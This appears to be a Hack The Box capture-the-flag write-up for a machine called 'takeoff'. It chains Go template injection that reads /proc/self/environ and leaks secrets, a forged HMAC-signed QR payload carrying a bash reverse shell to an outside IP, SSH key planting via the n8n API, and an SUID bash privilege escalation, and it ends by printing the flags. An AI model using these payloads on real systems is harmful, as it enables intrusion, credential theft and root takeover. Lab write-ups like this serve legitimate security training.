# Informations
After looking with nmap i found out that there are 2 TCP Ports open:
- 22 (SSH)
- 80 (WEB)

# Web Application
## Looking
The Web Application is containing a Sign-In and Sign-Up Page.
So i registered a new account and logged in.
With a little bit of research you find a Page to book a flight with payment processing etc.</br>
For the payment card i used (https://www.betterbugs.io/development-tools/credit-card-generator)</br>
After a successfull payment, you can click on "View Trip".</br>
With "View Trip", you see a QR-Code and also a Download Button for a PDF.</br>
After Downloading the PDF and viewing the content with "cat htb.pdf", i was able to see a Producer Version "/Producer (FPDF 1.7)"</br>
After a little bit of research, it was clear that they were using GoLang as Backend Language.

## Possible Initial-Foothold
In the "Check In"-Tab, you were able to check in with the created "Trip", when viewing the Network, i was able to see that a post request was going out with a HASH-based qr_data variable (the QR-Code as Hash).</br>
When decoding the qr_data string with (CyberChef), from URL-Decode to Base64 Decode, i was able to see that the **QR-Code** contains some **Vulnerable Data**.
```
N*gob.VerifyTicketAuthenticityVerifyTicketAuthenticityÿData
ÿ´ÿÿ°ÿ¬{"PNR":"EYU4A7","Token":"0c2056c41ed2462f379e4e18f5035c06","Seat":"1A","Passenger":"Johna Stones","NotifyCmd":"check-in-notify --pnr EYU4A7 --email johna.stones@gmail.com"}+ N-ÿ¥(fÍ$we7¨å·¤xôyúÄ¯/M
```
So the goal was to test if the "NotifyCmd", possibly gives me access to the Server.</br>
But for that i need to find the HASH encoding Secret.

## SSTI to get HMAC Secret
When looking clearly in the "Trips"-Tab, you can click on "Manage" and from there you can add "Notes".
And the "Notes", get displayed in the PDF.
With a little SSTI (Server-Side Template Injection), i found out that i was able to inject stuff, that the Backend Server will execute and put into the PDF.
So the Backend Server was using a GoLang PDF Template Library.
With a little bit of enumeration i found a interesting Function that i can use to enumerate through Files on the Backend Server.
```
{{.File "/dir/somewhere/file.smth"}}
```

So i used this function to get the currents process enviroment variables
```
{{.File "/proc/self/environ"}}
```

With this i found some interesting stuff
- TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
- N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo

The "TICKET_VALIDATION_TOKEN" is the HMAC (Hash-based Message Authentication Code) for the QR-Code, with the right forger, i was able to rebuid the GoLang -> gob -> HMAC Structure.

# INITIAL FOOTHOLD
So now i build my own QR-Code Hash with a little "Reverse-Shell"-Payload.
```
{
  "PNR": "EYU4A7",
  "Token": "0c2056c41ed2462f379e4e18f5035c06",
  "Seat": "1A",
  "Passenger": "Johna Stones",
  "NotifyCmd": "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"
}
```

After sending the QR-Code with the Payload i have my Initial-Foothold.

# System Informations
With a little bit of researching i found a open port for n8n (5678) using `ss -tulpn`
The n8n service has a API that i can call localy through that port. (http://127.0.0.1:5678/api/v1)

Also i found with systemctl list-units, that there was a running docker.service, but no n8n service, so it was possibly running in a docker-container

With the n8n api i was able to execute command through a Webhook Workflow and enumerate through the directorys, where i found a mounted directory to a User (kpark)
The Directory /home/kpark is mounted to /root

With that in mind i was generating a new ssh key locally `ssh-keygen -f htb` and using the n8n api i copied the public key to `/home/kpark/.ssh/authorized_keys`
Now i was able to connect to kpark through ssh with my private key
```
ssh -i htb kpark@10.129.142.210
```

# Local Privilege Escalation (LPE)
With the docker container in mind, i was copying the `/usr/bin/bash` to `/home/kpark`.
By using the docker container, that was running as root, i changed the permissions for the `/home/kpark/bash`.
`/root` -> `/home/kpark`
```
chown root:root /root/bash
chmod 4755 /root/bash
```
The 4755, set the correct permission + SUID
```
-rwsr-xr-x 1 root root  1.3M Nov  4 13:45 bash
```

With SUID (Set User ID), i can run the file/program with the permissions of the owner.</br>
(https://medium.com/@khadidja-toumi/suid-privilege-escalation-9841f6179d5f)

After executing the bash, i finally had root.
```
kpark@takeoff:~$ ./bash -p
bash-5.2# whoami
root
bash-5.2#
```

# Final
Now i have the user.txt and the root.txt
```
kpark@takeoff:~$ ls
bash  user.txt
kpark@takeoff:~$ cat user.txt
a7c847e328914dfda5f674dda45a0c36
kpark@takeoff:~$ ./bash -p
bash-5.2# ls /root
root.txt
bash-5.2# cat /root/root.txt
7ed4e19e202334a8a4a15543b1a5793a
bash-5.2#
```
